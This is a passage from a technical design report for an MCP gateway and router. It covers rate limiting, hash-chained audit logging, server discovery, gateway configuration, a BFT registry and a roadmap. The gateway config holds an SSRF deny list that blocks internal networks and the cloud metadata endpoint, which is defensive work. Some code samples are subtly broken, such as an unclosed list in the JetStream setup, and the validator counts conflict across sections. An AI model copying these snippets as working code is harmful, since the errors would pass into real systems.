                              zip(["global", "tenant", "user", "tool"], checks)}
            )
        
        # Debit all levels
        await asyncio.gather(
            self._debit_bucket("global", "all", config.cost_per_call),
            self._debit_bucket(f"tenant:{tenant_id}", tool_name, config.cost_per_call),
            self._debit_bucket(f"user:{user_id}", tool_name, config.cost_per_call),
            self._debit_bucket(f"tool:{tool_name}", "global", config.cost_per_call),
        )
        
        return RateLimitResult(allowed=True)
    
    async def _check_bucket(self, scope: str, subscope: str, 
                           config: RateLimitConfig) -> BucketState:
        key = f"ratelimit:{scope}:{subscope}"
        
        # Atomic check-and-refill via Lua script
        lua_script = """
        local key = KEYS[1]
        local capacity = tonumber(ARGV[1])
        local refill_rate = tonumber(ARGV[2])
        local cost = tonumber(ARGV[3])
        local now = tonumber(ARGV[4])
        
        local bucket = redis.call('HMGET', key, 'tokens', 'last_refill')
        local tokens = tonumber(bucket[1]) or capacity
        local last_refill = tonumber(bucket[2]) or now
        
        -- Refill tokens
        local elapsed = now - last_refill
        tokens = math.min(capacity, tokens + elapsed * refill_rate)
        
        -- Check if enough tokens
        if tokens >= cost then
            return {1, tokens - cost, 0}  -- allowed, remaining, retry_after
        else
            local retry_after = math.ceil((cost - tokens) / refill_rate)
            return {0, tokens, retry_after}  -- denied, remaining, retry_after
        end
        """
        
        now = time.time()
        result = self.redis.eval(
            lua_script, 1, key,
            config.capacity, config.refill_rate, config.cost_per_call, now
        )
        
        return BucketState(
            allowed=bool(result[0]),
            tokens=result[1],
            retry_after=result[2]
        )
```

### 9.3 Tool-Cost-Based Rate Limiting

Different tools have vastly different resource costs [^245^]:

```yaml
# Tool cost configuration
tool_costs:
  list_files: 1           # Cached, low cost
  read_file: 1            # Fast, cached
  search_text: 5          # Moderate compute
  query_database: 10      # DB connection pool
  run_deep_scan: 100      # Expensive, 90s worker
  train_model: 500        # GPU-intensive
  delete_all_data: 1000   # Dangerous, heavily restricted
```

### 9.4 Token Budget Quotas

For MCP servers connected to LLM-backed features, request counting understates actual cost [^245^]:

```python
class TokenBudgetLimiter:
    """Dual-axis limiting: requests per minute + tokens per hour."""
    
    async def post_call_accounting(
        self,
        tenant_id: str,
        tool_name: str,
        actual_tokens: int,
        upstream_cost: float
    ):
        """Debit actual measured cost after tool execution."""
        
        # Debit request count (coarse circuit breaker)
        await self.request_limiter.debit(tenant_id, tool_name, 1)
        
        # Debit token budget (binding constraint)
        await self.token_limiter.debit(tenant_id, actual_tokens)
        
        # Debit cost budget (for LLM-backed tools)
        if upstream_cost > 0:
            await self.cost_limiter.debit(tenant_id, upstream_cost)
    
    async def pre_call_admission(
        self,
        tenant_id: str,
        estimated_tokens: int
    ) -> bool:
        """Pre-reject requests that obviously exceed remaining budget."""
        remaining = await self.token_limiter.remaining(tenant_id)
        return remaining >= estimated_tokens
```

---

## 10. Audit Trail Systems for Agent Actions

### 10.1 Regulatory Requirements

The EU AI Act mandates detailed logging for high-risk AI systems [^299^][^306^]:

| Framework | Key Requirements | Retention | Penalty |
|-----------|-----------------|-----------|---------|
| EU AI Act | Automatic event logging, human oversight records | Per risk classification | €35M or 7% revenue |
| SOC 2 | Access controls, change management, incident response | 1+ years | Loss of certification |
| HIPAA | ePHI access tracking (§164.312(b)) | 6 years | Criminal penalties |
| GDPR | Data access logs, consent records | Processing duration + reasonable period | 4% global revenue |

### 10.2 Immutable Hash-Chained Audit Log

The `agent-audit-trail-mcp` project provides a production-ready pattern [^243^]:

```python
import hashlib
import json
from datetime import datetime, timezone
from typing import Optional

class ImmutableAuditLog:
    """Tamper-evident audit logging with SHA-256 hash chain."""
    
    def __init__(self, agent_id: str, log_file: str):
        self.agent_id = agent_id
        self.log_file = log_file
        self._prev_hash = "0" * 64
        
        # Load last hash if log exists
        try:
            with open(log_file, 'r') as f:
                for line in f:
                    entry = json.loads(line)
                    self._prev_hash = entry["hash"]
        except FileNotFoundError:
            pass
    
    def log_event(
        self,
        event_type: str,      # decision, action, error, access, data_processing
        action: str,          # What was done
        details: dict,        # Full parameters and context
        outcome: str,         # success, failure, blocked
        user_id: Optional[str] = None,
        tenant_id: Optional[str] = None,
        tool_name: Optional[str] = None,
        model_id: Optional[str] = None,
    ) -> AuditEntry:
        """Log an immutable audit event."""
        
        timestamp = datetime.now(timezone.utc).isoformat()
        
        entry_data = {
            "timestamp": timestamp,
            "agent_id": self.agent_id,
            "event_type": event_type,
            "action": action,
            "details": details,
            "outcome": outcome,
            "user_id": user_id,
            "tenant_id": tenant_id,
            "tool_name": tool_name,
            "model_id": model_id,
            "prev_hash": self._prev_hash,
        }
        
        # Compute hash of this entry (includes prev_hash for chaining)
        entry_json = json.dumps(entry_data, sort_keys=True)
        entry_hash = hashlib.sha256(entry_json.encode()).hexdigest()
        
        entry_data["hash"] = entry_hash
        
        # Append to log
        with open(self.log_file, 'a') as f:
            f.write(json.dumps(entry_data) + '\n')
        
        self._prev_hash = entry_hash
        
        return AuditEntry(**entry_data)
    
    def verify_integrity(self) -> IntegrityReport:
        """Verify the hash chain is intact."""
        prev_hash = "0" * 64
        entries = []
        tampered = []
        
        with open(self.log_file, 'r') as f:
            for line_num, line in enumerate(f, 1):
                entry = json.loads(line)
                
                # Verify prev_hash linkage
                if entry["prev_hash"] != prev_hash:
                    tampered.append({
                        "line": line_num,
                        "expected_prev": prev_hash,
                        "actual_prev": entry["prev_hash"]
                    })
                
                # Verify entry hash
                entry_copy = {k: v for k, v in entry.items() if k != "hash"}
                computed = hashlib.sha256(
                    json.dumps(entry_copy, sort_keys=True).encode()
                ).hexdigest()
                
                if computed != entry["hash"]:
                    tampered.append({
                        "line": line_num,
                        "computed_hash": computed,
                        "stored_hash": entry["hash"]
                    })
                
                prev_hash = entry["hash"]
                entries.append(entry)
        
        return IntegrityReport(
            total_entries=len(entries),
            tampered_entries=len(tampered),
            tampered_details=tampered,
            is_valid=len(tampered) == 0
        )
```

### 10.3 Six Essential Audit Elements

Every AI agent action must capture [^240^]:

1. **Input**: What prompt or instruction triggered the action
2. **Output**: What the agent generated or modified
3. **Data Accessed**: Which files, databases, APIs the agent touched
4. **Model Identity**: Which AI model and version performed the action
5. **User Identity**: Who authorized or initiated the action
6. **Timestamp**: Precise timing for correlation and sequencing

### 10.4 Structured Logging Schema

```json
{
  "event": "agent.tool_call",
  "event_id": "evt_a1b2c3d4e5f6",
  "timestamp": "2026-03-12T14:55:29Z",
  "trace_id": "trace_abc123",
  "span_id": "span_def456",
  
  "actor": {
    "user_id": "user@organization.com",
    "tenant_id": "tenant_acme_123",
    "role": "developer",
    "session_id": "sess_xyz789"
  },
  
  "action": {
    "tool_name": "database_query",
    "tool_server": "mcp-postgres.internal",
    "input_hash": "sha256:a3f1c2d4e5b6...",
    "input_preview": "SELECT * FROM customers WHERE...",
    "output_hash": "sha256:b4g2h3i5j6k7...",
    "output_preview": "50 rows returned",
    "duration_ms": 245,
    "outcome": "success"
  },
  
  "policy": {
    "rate_limit_check": "passed",
    "ssrf_check": "passed",
    "sandbox": "firecracker-uuid-abc",
    "poisoning_check": "passed"
  },
  
  "compliance": {
    "eu_ai_act_article_12": true,
    "retention_class": "high_risk",
    "encryption": "aes256_gcm"
  }
}
```

### 10.5 NATS JetStream for Distributed Audit Streaming

For production-scale audit logging, NATS JetStream provides durable, replicated event streams [^391^][^396^]:

```python
import asyncio
from nats.aio.client import Client as NATS
from nats.js.api import StreamConfig, RetentionPolicy

class JetStreamAuditLogger:
    """Distributed audit logging with NATS JetStream."""
    
    async def initialize(self):
        self.nc = await NATS.connect("nats://localhost:4222")
        self.js = self.nc.jetstream()
        
        # Create audit log stream
        await self.js.add_stream(StreamConfig(
            name="MCP_AUDIT",
            subjects=["audit.>",
            retention_policy=RetentionPolicy.WORK_QUEUE,
            max_msgs=-1,  # Unlimited
            max_bytes=10_000_000_000,  # 10GB
            max_age=90 * 24 * 60 * 60,  # 90 days
            storage="file",
            replicas=3,
        ))
    
    async def log(self, entry: AuditEntry):
        """Publish audit entry to JetStream."""
        subject = f"audit.{entry.tenant_id}.{entry.event_type}"
        
        await self.js.publish(
            subject,
            json.dumps(entry.to_dict()).encode(),
            headers={
                "Nats-Msg-Id": entry.event_id,  # Idempotency
                "Tenant-Id": entry.tenant_id,
                "Retention-Class": entry.retention_class,
            }
        )
    
    async def query_by_tenant(self, tenant_id: str, 
                              start: datetime, end: datetime):
        """Query audit log for tenant."""
        consumer = await self.js.pull_subscribe(
            f"audit.{tenant_id}.*",
            durable=f"query-{tenant_id}"
        )
        
        messages = []
        while True:
            msgs = await consumer.fetch(100)
            if not msgs:
                break
            for msg in msgs:
                entry = AuditEntry.from_json(msg.data)
                if start <= entry.timestamp <= end:
                    messages.append(entry)
                await msg.ack()
        
        return messages
```

---

## 11. MCP Server Discovery & Metadata

### 11.1 Server Card Specification

The `.well-known/mcp.json` endpoint provides standardized server discovery [^307^]:

```json
{
  "$schema": "https://modelcontextprotocol.io/schemas/server-card/v1.0",
  "version": "1.0",
  "protocolVersion": "2025-06-18",
  "serverInfo": {
    "name": "Example MCP Server",
    "version": "1.4.0",
    "description": "Provides database access and file operations",
    "homepage": "https://example.com",
    "icons": {
      "16": "/icons/icon-16.png",
      "32": "/icons/icon-32.png"
    }
  },
  "transport": {
    "type": "streamable-http",
    "url": "https://api.example.com/mcp"
  },
  "authentication": {
    "type": "oauth2",
    "authorizationUrl": "https://auth.example.com/authorize",
    "tokenUrl": "https://auth.example.com/token",
    "scopes": ["read", "write"]
  },
  "capabilities": {
    "tools": true,
    "resources": true,
    "prompts": false,
    "sampling": false
  },
  "tools": [
    {
      "name": "query_database",
      "description": "Execute read-only SQL queries",
      "inputSchema": { ... },
      "rateLimit": {
        "requestsPerMinute": 60,
        "costPerCall": 10
      }
    }
  ],
  "attestation": {
    "signedBy": "did:sovereign:z6Mks...",
    "signature": "base64_signature...",
    "provenance": "https://rekor.sigstore.dev/api/v1/log/entries?logIndex=12345"
  }
}
```

### 11.2 Discovery Mechanism

```python
class MCPServerDiscovery:
    """MCP server discovery with verification."""
    
    async def discover(self, server_url: str) -> ServerCard:
        """Discover and verify MCP server."""
        
        # Fetch .well-known/mcp.json
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"{server_url}/.well-known/mcp.json"
            ) as resp:
                card_data = await resp.json()
        
        card = ServerCard(**card_data)
        
        # Verify protocol version compatibility
        if not self._is_compatible(card.protocolVersion):
            raise IncompatibleVersionError(
                f"Server requires {card.protocolVersion}, "
                f"we support {SUPPORTED_VERSIONS}"
            )
        
        # Verify attestation if present
        if card.attestation:
            await self._verify_attestation(card)
        
        # Check registry reputation score
        reputation = await self.registry.get_reputation(
            card.serverInfo.name,
            card.attestation.signedBy if card.attestation else None
        )
        
        if reputation.score < MINIMUM_REPUTATION:
            raise UntrustedServerError(
                f"Server reputation {reputation.score} below threshold"
            )
        
        return card
    
    async def _verify_attestation(self, card: ServerCard):
        """Verify Sigstore attestation."""
        # Verify signature against DID
        cosign.verify(
            certificate_identity=card.attestation.signedBy,
            # ...
        )
        
        # Check transparency log
        rekor.verify_entry(card.attestation.provenance)
```

### 11.3 Centralized Registry with Federation

```python
class FederatedRegistry:
    """Federated MCP registry with BFT consensus."""
    
    def __init__(self, validator_nodes: list[ValidatorNode]):
        self.validators = validator_nodes
        self.consensus_threshold = len(validator_nodes) * 2 // 3 + 1
    
    async def register_server(self, registration: ServerRegistration) -> bool:
        """Register server with BFT consensus."""
        
        # Phase 1: Validate locally
        validation_result = await self._validate_registration(registration)
        if not validation_result.valid:
            return False
        
        # Phase 2: Propose to validators
        proposal = Proposal(
            type="server_registration",
            data=registration,
            proposer=self.node_id,
            timestamp=now()
        )
        
        # Phase 3: Collect votes (2/3+1 required)
        votes = await self._collect_votes(proposal)
        
        if len(votes.approve) >= self.consensus_threshold:
            # Phase 4: Commit to registry
            await self._commit_registration(registration)
            return True
        
        return False
    
    async def _validate_registration(self, reg: ServerRegistration) -> Validation:
        """Comprehensive validation before voting."""
        checks = await asyncio.gather(
            # Code analysis
            self._scan_source_code(reg.source_url),
            # Tool description analysis
            self._scan_tool_descriptions(reg.tools),
            # Dependency check
            self._check_dependencies(reg.dependencies),
            # Reputation check
            self._check_publisher_reputation(reg.publisher_did),
            # Build verification
            self._verify_reproducible_build(reg),
        )
        
        return Validation(valid=all(checks), details=checks)
```

---

## 12. Gateway Architecture Patterns

### 12.1 Gateway Pattern Overview

The MCP gateway acts as a centralized control plane between AI agents and MCP servers [^219^][^222^]:

**Core Functions**:
- **Request Routing**: Proxy JSON-RPC requests to appropriate backend servers
- **Authentication & Authorization**: OAuth 2.1 enforcement, RBAC, scope validation
- **Policy Enforcement**: Rate limiting, egress filtering, tool whitelisting
- **Security Scanning**: Tool description validation, poisoning detection
- **Audit Logging**: Complete request/response logging with attribution
- **Sandbox Orchestration**: Firecracker/gVisor lifecycle management

### 12.2 Open-Source Gateway Implementations

| Gateway | Language | Key Features | Maturity |
|---------|----------|-------------|----------|
| **Microsoft MCP Gateway** | .NET/K8s | Kubernetes-native, Docker-based servers | Production [^216^] |
| **Tyk MCP Gateway** | Go | OpenAPI→MCP conversion, OAuth, rate limiting | Production [^395^] |
| **Kong AI Gateway** | Lua/Go | OIDC, Key Auth, rate limiting, quotas | Production [^400^] |
| **Gravitee Agent Mesh** | Java | Agent-to-agent communication, prompt templating | Production [^400^] |
| **Solo.io kgateway** | Go/Envoy | Envoy-based, MCP service federation | Production [^400^] |
| **APIPark** | Go | Lightweight, plugin architecture | Early [^400^] |

### 12.3 Microsoft MCP Gateway Architecture

Microsoft's MCP Gateway provides a Kubernetes-native reference architecture [^216^]:

```yaml
# MCP Gateway deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mcp-gateway
  namespace: mcp
spec:
  replicas: 3
  selector:
    matchLabels:
      app: mcp-gateway
  template:
    spec:
      containers:
      - name: gateway
        image: mcp-gateway:v1.0
        ports:
        - containerPort: 8000
        env:
        - name: AUTH_MODE
          value: "oauth2"
        - name: SANDBOX_RUNTIME
          value: "firecracker"
---
# MCP Server Adapter (per-server container)
apiVersion: mcp.microsoft.com/v1
kind: MCPAdapter
metadata:
  name: github-tool
spec:
  image: mcp-github-tool:v2.1
  sandbox:
    enabled: true
    runtime: gVisor
    networkPolicy:
      egress:
        - to:
          - namespaceSelector:
              matchLabels:
                name: github-api
          ports:
          - protocol: TCP
            port: 443
  resources:
    limits:
      cpu: "500m"
      memory: "256Mi"
  auth:
    requiredScopes: ["repo:read"]
```

### 12.4 Tyk MCP Gateway

Tyk's MCP Gateway (spec 2025-11-25 compliant) offers [^395^][^219^]:

- **OpenAPI→MCP Bridge**: Convert existing REST APIs to MCP tools automatically
- **Policy Engine**: Open Policy Agent (OPA) integration for custom authorization
- **Rate Limiting**: Per-tool, per-tenant quotas
- **Streamable HTTP**: Full SSE and HTTP transport support
- **OAuth 2.1**: Native PKCE and resource indicator support

### 12.5 Gateway Configuration for MEOK

```yaml
# meok-gateway-config.yaml
gateway:
  # Core settings
  listen: :8443
  tls:
    cert: /etc/meok/server.crt
    key: /etc/meok/server.key
    mtls:
      enabled: true
      client_ca: /etc/meok/client-ca.crt
  
  # Protocol
  mcp:
    protocol_version: "2025-11-25"
    transports: ["streamable-http"]
    
  # Authentication
  auth:
    type: "oauth2.1"
    pkce_required: true
    resource_indicators: true
    token_validation:
      audience_required: true
      issuer_whitelist:
        - "https://auth.meok.io"
    
  # Multi-tenancy
  tenancy:
    isolation: "namespace"  # namespace | vpc | silo
    header: "X-Meok-Tenant-ID"
    jwt_claim: "tenant_id"
    
  # Rate limiting
  rate_limiting:
    storage: "redis"
    redis_url: "redis://meok-redis:6379"
    levels:
      global:
        requests_per_second: 10000
      tenant:
        requests_per_second: 100
        burst: 200
      user:
        requests_per_second: 10
        burst: 20
      tool:
        default_cost: 1
        overrides:
          database_query: 5
          file_upload: 10
          code_execution: 50
          
  # Sandboxing
  sandbox:
    default_runtime: "firecracker"
    runtimes:
      firecracker:
        vcpus: 2
        memory_mb: 512
        max_execution_seconds: 30
        network_policy: "restricted"
      gvisor:
        max_execution_seconds: 60
        network_policy: "monitored"
      container:
        max_execution_seconds: 300
        network_policy: "internal-only"
        seccomp_profile: "mcp-restricted"
    
  # Security scanning
  security:
    tool_validation:
      enabled: true
      stages:
        - json_schema
        - pattern_matching
        - llm_judge
      llm_judge_model: "claude-3.5-sonnet"
    
    poisoning_detection:
      enabled: true
      tool_pinning: true
      rug_pull_alert: true
      
    ssrf_prevention:
      enabled: true
      blocked_networks:
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
        - "127.0.0.0/8"
        - "169.254.0.0/16"
      blocked_hosts:
        - "metadata.google.internal"
        - "169.254.169.254"
      
  # Audit logging
  audit:
    backend: "nats-jetstream"
    nats_url: "nats://meok-nats:4222"
    stream: "MCP_AUDIT"
    retention_days: 90
    encryption: "aes256-gcm"
    integrity: "hash-chain"
    
  # Registry
  registry:
    type: "federated-bft"
    validators:
      - "validator-1.meok.io:8443"
      - "validator-2.meok.io:8443"
      - "validator-3.meok.io:8443"
      - "validator-4.meok.io:8443"
    consensus_threshold: 3  # 2/3 + 1 of 4
    attestation:
      required: true
      sigstore: true
      sbom: true
```

---

## 13. Transport: gRPC vs HTTP for MCP

### 13.1 Performance Comparison

Independent benchmarks show significant performance differences between gRPC and HTTP/JSON-RPC [^254^]:

| Benchmark | gRPC (protobuf/HTTP2) | REST (JSON/HTTP1.1) | Delta |
|-----------|----------------------|---------------------|-------|
| Small payload latency (1KB) | 2.3ms p50 | 10.1ms p50 | gRPC 77% faster |
| Large payload latency (100KB) | 14.2ms p50 | 16.7ms p50 | gRPC 15% faster |
| Throughput per core | 50-100K RPS | 15-35K RPS | gRPC 2-3x higher |
| Serialized payload size | 50-200 bytes | 500-2,000 bytes | gRPC 10x smaller |
| p99 tail latency (high concurrency) | 9ms | 34ms | gRPC 3.7x lower |
| CPU per request (100K RPS) | ~12μs | ~38μs | gRPC 3.2x cheaper |
| Bandwidth at 100K RPS (1KB msg) | ~10MB/s | ~100MB/s | gRPC 10x less |

### 13.2 Trade-off Analysis for MCP

**Arguments for gRPC**:
- 77% lower latency on small payloads (typical MCP tool calls)
- Native streaming support (4 modes: unary, server, client, bidirectional)
- Strict schema enforcement via Protocol Buffers
- Built-in error model with 17 canonical status codes
- HTTP/2 multiplexing eliminates connection setup overhead

**Arguments against gRPC for MCP**:
- No native browser support (requires gRPC-Web proxy) [^254^]
- MCP spec is JSON-RPC 2.0 — would require protocol change
- No CDN caching (HTTP cache headers ignored) [^254^]
- More complex debugging (binary payloads)
- Less ecosystem maturity for MCP specifically

**Recommendation**: For MEOK Phase 1, implement Streamable HTTP (spec-compliant). For Phase 2, add gRPC as an optional high-performance transport for internal services while maintaining HTTP for external-facing endpoints.

### 13.3 Hybrid Transport Architecture

```python
class HybridTransportServer:
    """Support both HTTP and gRPC transports."""
    
    async def start(self):
        # HTTP server (spec-compliant, external-facing)
        self.http_app = web.Application()
        self.http_app.router.add_post('/mcp', self.handle_http_mcp)
        
        # gRPC server (internal, high-performance)
        self.grpc_server = grpc.aio.server()
        add_MCPServiceServicer_to_server(self, self.grpc_server)
        
        await asyncio.gather(
            web._run_app(self.http_app, host='0.0.0.0', port=8443),
            self.grpc_server.start(),
        )
    
    async def handle_http_mcp(self, request):
        """Handle Streamable HTTP MCP requests."""
        body = await request.json()
        result = await self.process_jsonrpc(body)
        return web.json_response(result)
    
    async def CallTool(self, request, context):
        """Handle gRPC tool calls (internal)."""
        result = await self.execute_tool(
            name=request.tool_name,
            arguments=json.loads(request.arguments_json)
        )
        return CallToolResponse(
            content_json=json.dumps(result)
        )
```

---

## 14. BFT Governance for Registry Consensus

### 14.1 BFT Consensus Fundamentals

Byzantine Fault Tolerant (BFT) consensus enables a distributed system to agree on a value even when some nodes fail or behave maliciously [^259^][^262^]:

**Core Properties**:
- **Safety**: No two honest nodes agree on different values
- **Liveness**: The system eventually makes progress
- **Fault Tolerance**: Tolerates up to `f` Byzantine faults among `3f + 1` total nodes
- **Consensus Threshold**: Requires `2/3 + 1` votes for commit

**Four-Phase Consensus** [^259^]:
1. **Leader Election**: One node selected as proposer (rotated to prevent censorship)
2. **Proposal**: Leader broadcasts proposed block/transaction
3. **Voting**: Two-round voting (pre-vote → commit) with supermajority requirement
4. **Finality**: Block considered final when commit votes from 2/3+1 received

### 14.2 Practical BFT for MCP Registry

```python
from dataclasses import dataclass
from typing import List, Set
import hashlib

@dataclass
class Vote:
    validator_id: str
    proposal_hash: str
    round: int
    phase: str  # prevote | precommit
    signature: str

@dataclass 
class Proposal:
    action: str           # register | deregister | update_reputation
    data: dict
    proposer: str
    round: int
    timestamp: float

class MCPRegistryBFT:
    """BFT consensus for MCP registry governance."""
    
    def __init__(self, validators: List[str], my_id: str):
        self.validators = set(validators)
        self.n = len(validators)
        self.f = (self.n - 1) // 3  # Max Byzantine faults tolerated
        self.threshold = 2 * self.n // 3 + 1  # 2/3 + 1
        self.my_id = my_id
        self.current_round = 0
        self.locked_value = None
        self.locked_round = -1
    
    async def propose_registration(self, registration: ServerRegistration):
        """Leader proposes a new server registration."""
        
        if not self._is_leader():
            return
        
        proposal = Proposal(
            action="register",
            data=registration.to_dict(),
            proposer=self.my_id,
            round=self.current_round,
            timestamp=time.time()
        )
        
        proposal_hash = self._hash_proposal(proposal)
        
        # Phase 1: Broadcast proposal
        await self._broadcast("proposal", {
            "proposal": proposal,
            "hash": proposal_hash
        })
        
        # Phase 2: Collect prevotes
        prevotes = await self._collect_votes(
            proposal_hash, 
            phase="prevote",
            timeout=5.0
        )
        
        if len(prevotes) < self.threshold:
            await self._start_next_round()
            return
        
        # Phase 3: Collect precommits
        precommits = await self._collect_votes(
            proposal_hash,
            phase="precommit", 
            timeout=5.0
        )
        
        if len(precommits) >= self.threshold:
            # COMMIT
            await self._commit_registration(registration)
            await self._broadcast("commit", {
                "proposal_hash": proposal_hash,
                "votes": [v.signature for v in precommits]
            })
    
    async def _collect_votes(self, proposal_hash: str, 
                            phase: str, timeout: float) -> List[Vote]:
        """Collect votes from validators with timeout."""
        votes = []
        voted = set()
        
        deadline = time.time() + timeout
        
        while time.time() < deadline and len(votes) < self.threshold:
            vote = await self._receive_vote(timeout=deadline - time.time())
            
            if vote is None:
                break
            
            # Validate vote
            if (vote.validator_id in self.validators and
                vote.validator_id not in voted and
                vote.proposal_hash == proposal_hash and
                vote.phase == phase and
                self._verify_signature(vote)):
                
                votes.append(vote)
                voted.add(vote.validator_id)
        
        return votes
    
    def _is_leader(self) -> bool:
        """Round-robin leader election."""
        leader_index = self.current_round % self.n
        return list(self.validators)[leader_index] == self.my_id
    
    def _hash_proposal(self, proposal: Proposal) -> str:
        """Compute deterministic hash of proposal."""
        data = json.dumps(proposal, sort_keys=True)
        return hashlib.sha256(data.encode()).hexdigest()
```

### 14.3 Validator Selection and Incentives

**Validator Requirements**:
- Reputation stake (slashed for malicious behavior)
- Geographic distribution (minimum 3 regions)
- Independent attestation infrastructure
- Continuous availability (>99.9% uptime)

**Reputation Scoring**:
```python
class ValidatorReputation:
    def compute_score(self, validator_id: str) -> float:
        factors = {
            'attestation_accuracy': 0.30,   # Correct votes / Total votes
            'uptime': 0.25,                 # Time online / Total time
            'response_time': 0.20,          # Speed of voting
            'diversity_bonus': 0.15,        # Unique ISP/region
            'slashing_history': 0.10,       # No slashing = full points
        }
        
        score = sum(
            weight * self._measure(validator_id, factor)
            for factor, weight in factors.items()
        )
        
        return min(1.0, max(0.0, score))
```

---

## 15. Proposed MEOK Router Architecture

### 15.1 System Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                     MEOK MCP ROUTER                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           │
│  │   Client 1   │  │   Client 2   │  │   Client N   │           │
│  │  (Claude)    │  │  (Cursor)    │  │  (Custom)    │           │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘           │
│         │                 │                 │                    │
│         └─────────────────┼─────────────────┘                    │
│                           ▼                                      │
│  ┌─────────────────────────────────────────────────────┐        │
│  │              GATEWAY LAYER (OAuth 2.1)               │        │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────────────┐  │        │
│  │  │  Auth    │  │  Rate    │  │  Tool Validation │  │        │
│  │  │ Service  │  │  Limiter │  │  (LLM Judge)     │  │        │
│  │  └──────────┘  └──────────┘  └──────────────────┘  │        │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────────────┐  │        │
│  │  │  Tenant  │  │  Router  │  │  Audit Logger    │  │        │
│  │  │  Isolator│  │          │  │  (Hash Chain)    │  │        │
│  │  └──────────┘  └──────────┘  └──────────────────┘  │        │
│  └─────────────────────────────────────────────────────┘        │
│                           │                                      │
│                           ▼                                      │
│  ┌─────────────────────────────────────────────────────┐        │
│  │           SANDBOX ORCHESTRATION LAYER                │        │
│  │                                                      │        │
│  │  ┌──────────────┐  ┌──────────────┐                 │        │
│  │  │ Firecracker  │  │   gVisor     │                 │        │
│  │  │  MicroVMs    │  │  Sandbox     │                 │        │
│  │  │  (Critical)  │  │  (Standard)  │                 │        │
│  │  └──────────────┘  └──────────────┘                 │        │
│  └─────────────────────────────────────────────────────┘        │
│                           │                                      │
│                           ▼                                      │
│  ┌─────────────────────────────────────────────────────┐        │
│  │              BFT REGISTRY LAYER                      │        │
│  │                                                      │        │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐         │        │
│  │  │Validator1│  │Validator2│  │ValidatorN│         │        │
│  │  │  (AP)    │  │  (EU)    │  │  (US)    │         │        │
│  │  └──────────┘  └──────────┘  └──────────┘         │        │
│  │                                                      │        │
│  │  Consensus: 2/3+1 BFT with rotating leadership      │        │
│  └─────────────────────────────────────────────────────┘        │
│                           │                                      │
│                           ▼                                      │
│  ┌─────────────────────────────────────────────────────┐        │
│  │              MCP SERVER POOL                         │        │
│  │                                                      │        │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐         │        │
│  │  │ Server A │  │ Server B │  │ Server C │  ...    │        │
│  │  │(Verified)│  │(Verified)│  │(Verified)│         │        │
│  │  └──────────┘  └──────────┘  └──────────┘         │        │
│  └─────────────────────────────────────────────────────┘        │
└─────────────────────────────────────────────────────────────────┘
```

### 15.2 Component Specifications

#### 15.2.1 Gateway Layer

| Component | Technology | Purpose |
|-----------|-----------|---------|
| API Gateway | Envoy / Custom Go | HTTP/gRPC termination, routing |
| Auth Service | Keycloak / Custom | OAuth 2.1 + PKCE, JWT validation |
| Rate Limiter | Redis + Lua | Token bucket per tenant/user/tool |
| Tool Validator | LLM Judge + Patterns | Poisoning detection at registration |
| Tenant Isolator | K8s Namespaces + Network Policies | Per-tenant resource boundaries |
| Audit Logger | NATS JetStream | Immutable, hash-chained event log |

#### 15.2.2 Sandbox Orchestration

| Runtime | Use Case | Boot Time | Max Exec Time |
|---------|----------|-----------|---------------|
| Firecracker | Untrusted/external tools | ~125ms | 30s |
| gVisor | Standard/known tools | ~300ms | 60s |
| Hardened Container | Internal/verified tools | ~100ms | 300s |

#### 15.2.3 BFT Registry

| Parameter | Value |
|-----------|-------|
| Validator Nodes | 7 (geographically distributed) |
| Fault Tolerance | 2 Byzantine nodes |
| Consensus Threshold | 5 votes (2/3 + 1) |
| Leader Rotation | Per-block round-robin |
| Block Time | 5 seconds |
| Finality | Instant (BFT, not probabilistic) |

#### 15.2.4 Trust Model

```
Tier 1 - Internal (Highest Trust)
  └─ Signed by organization key
  └─ Firecracker sandbox
  └─ Full tool set available
  └─ Audit: standard logging

Tier 2 - Verified Partners
  └─ Sigstore attestation verified
  └─ gVisor sandbox
  └─ Whitelisted tools only
  └─ Audit: enhanced logging

Tier 3 - Community (Lowest Trust)
  └─ BFT consensus approval
  └─ Firecracker sandbox (strictest)
  └─ Read-only tools, no network egress
  └─ Audit: comprehensive + real-time alerts
```

### 15.3 Request Flow

```
1. Client sends tools/call request with Bearer token
   ↓
2. Gateway validates JWT (signature, expiry, audience)
   ↓
3. Gateway extracts tenant_id from JWT claim
   ↓
4. Rate Limiter checks all levels (global/tenant/user/tool)
   ↓
5. Tool Validator verifies tool is registered and not poisoned
   ↓
6. Sandbox Orchestrator provisions execution environment
   ↓
7. Tool executes in sandbox with network restrictions
   ↓
8. Post-execution: Output scanned for secrets/PII
   ↓
9. Audit Logger records complete event with hash chain
   ↓
10. Response returned to client
```

### 15.4 Key Architecture Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| Transport | Streamable HTTP (primary) + gRPC (internal) | Spec compliance + performance |
| Sandbox | Firecracker for untrusted, gVisor for standard | Security/performance balance |
| Auth | OAuth 2.1 + PKCE + Resource Indicators | Spec-mandated, most secure |
| Rate Limiting | Token bucket, hierarchical | Proven pattern, supports bursts |
| Audit | NATS JetStream + hash chain | Immutable, distributed, performant |
| Registry | BFT consensus (7 validators) | Tolerates 2 Byzantine faults |
| Discovery | `.well-known/mcp.json` + federated registry | Spec-compliant + sovereign |
| Attestation | Sigstore keyless signing | No key management, transparency log |

---

## 16. Implementation Roadmap

### Phase 1: Foundation (Months 1-3)

**Goal**: Core gateway with basic security

| Deliverable | Description |
|-------------|-------------|
| Gateway Core | HTTP server with JSON-RPC 2.0 handling |
| OAuth 2.1 | PKCE + Resource Indicators implementation |
| Rate Limiting | Token bucket per tenant |
| Audit Logging | Hash-chained local logs |
| Tool Validation | Regex pattern matching + schema validation |
| Container Sandbox | Docker + seccomp + AppArmor |

### Phase 2: Security Hardening (Months 4-6)

**Goal**: Production-grade isolation and governance

| Deliverable | Description |
|-------------|-------------|
| Firecracker Integration | MicroVM-based execution for untrusted tools |
| gVisor Integration | Syscall interception for standard tools |
